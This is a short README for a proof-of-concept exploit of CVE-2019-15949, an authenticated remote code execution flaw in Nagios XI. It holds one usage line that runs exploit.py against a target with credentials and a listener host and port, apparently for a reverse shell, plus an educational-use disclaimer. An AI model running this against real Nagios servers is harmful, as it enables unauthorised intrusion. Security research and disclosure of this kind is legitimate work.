# Nagiosxi CVE-2019–15949

A proof-of-concept for CVE-2019–15949 Nagiosxi Authenticated RCE

## Getting Started

### Executing program

* With python3
```
python3 exploit.py -t 'http://nagios.xi/' -b /nagiosxi/ -u username -p password -lh 127.0.0.1 -lp 1337
```

## Help

For help menu:
```
python3 exploit.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.